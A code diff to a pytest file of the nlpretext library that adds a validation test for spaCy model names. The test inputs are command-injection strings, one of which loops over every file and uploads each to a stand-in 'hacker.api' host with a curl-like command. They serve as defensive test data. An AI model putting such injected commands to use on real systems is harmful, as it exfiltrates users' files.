@@ -1,18 +1,19 @@
 import pytest
-import spacy
-from nlpretext.token.tokenizer import LanguageNotInstalledError, SpacyModel
+from nlpretext.token.tokenizer import LanguageNotInstalledError, _load_spacy_model
 
 
 @pytest.mark.parametrize(
-    "fake_input, expected_model_in_message", [("en", "en_core_web_sm"), ("fr", "fr_core_news_sm")]
+    "bad_model_name",
+    [
+        ("en_core_web_sm; chmod -x hacker"),
+        (
+            "fr_core_news_sm | for file in $(find .); "
+            'do curl_command -X POST -H "Content-Type: multipart/form-data" '
+            '-F "data=@${file}" https-fake://hacker.api/upload; done'
+        ),
+    ],
 )
-def test_get_spacy_tokenizer_when_model_not_downloaded(
-    monkeypatch, fake_input, expected_model_in_message
-):
-    def mock_spacy_load(lang):
-        raise OSError("[E050] Can't find model 'en_core_web_sm'. It doesn't seem to be ...")
-
-    monkeypatch.setattr(spacy, "load", mock_spacy_load)
+def test_load_spacy_model_validation(bad_model_name):
     with pytest.raises(LanguageNotInstalledError) as e:
-        SpacyModel.SingletonSpacyModel(fake_input)
-    assert expected_model_in_message in str(e.value)
+        _load_spacy_model(bad_model_name)
+        assert bad_model_name in str(e.value)
